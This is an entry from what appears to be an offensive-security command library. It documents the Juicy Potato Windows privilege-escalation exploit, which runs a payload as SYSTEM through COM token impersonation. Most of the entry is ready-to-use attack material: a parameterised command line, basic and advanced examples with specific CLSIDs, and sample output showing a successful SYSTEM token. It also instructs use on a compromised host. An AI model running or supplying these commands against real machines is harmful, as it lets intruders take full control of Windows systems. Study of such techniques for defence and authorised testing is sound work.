---
id: 56ca072d-969e-45b3-bad7-ac1ac436592a
name: juicy-potato-execute-program
type: command
executor: command_prompt
data: >-
  JuicyPotato.exe -l $_LOCAL_PORT -p "$_PAYLOAD_PATH" -t $_TOKEN_TYPE -c
  "$_CLSID"
output: >-
  C:\Windows\system32\spool\drivers\color>JuicyPotato.exe -l 9999 -p
  "C:\Windows\System32\spool\drivers\color\shell.bat" -t * -c
  "{e60687f7-01a1-40aa-86ac-db1cbf673334}"

  Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 9999

  ......

  [+] authresult 0

  {e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM


  [+] CreateProcessWithTokenW OK
created_at: '2020-06-24T21:19:46.824024+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - exploit
verified: true
validated: true
---

# juicy-potato-execute-program

## Command

```command_prompt
JuicyPotato.exe -l $_LOCAL_PORT -p "$_PAYLOAD_PATH" -t $_TOKEN_TYPE -c "$_CLSID"
```

## Description

Executes the Juicy Potato exploit to escalate privileges by impersonating a SYSTEM token via a specified CLSID and running a payload program as the elevated user. Use this in a command prompt on a compromised Windows host with impersonation privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l $_LOCAL_PORT | Local port for RPC listener (e.g., 9999; arbitrary if available) | Yes |
| -p "$_PAYLOAD_PATH" | Full path to the program or script to execute as SYSTEM (e.g., batch file) | Yes |
| -t $_TOKEN_TYPE | Token creation method (* for all, or specific like 4 for CreateProcessWithTokenW) | Yes |
| -c "$_CLSID" | COM class ID for impersonation (e.g., {e60687f7-01a1-40aa-86ac-db1cbf673334}) | Yes |

## Examples

### Basic Usage

```command_prompt
JuicyPotato.exe -l 9999 -p "C:\temp\payload.bat" -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

### Advanced Usage

```command_prompt
JuicyPotato.exe -l 1337 -p "C:\Windows\System32\calc.exe" -t 4 -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```

## Expected Output

Description of what output to expect when the command runs successfully.

```
C:\Windows\system32\spool\drivers\color>JuicyPotato.exe -l 9999 -p "C:\Windows\System32\spool\drivers\color\shell.bat" -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 9999
......
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

The payload (e.g., shell.bat) executes as SYSTEM, potentially spawning a new shell or downloading additional tools.

## Related

- [[procedures/Escalate-Privileges-Using-Juicy-Potato]]
- [[tools/Juicy-Potato]]
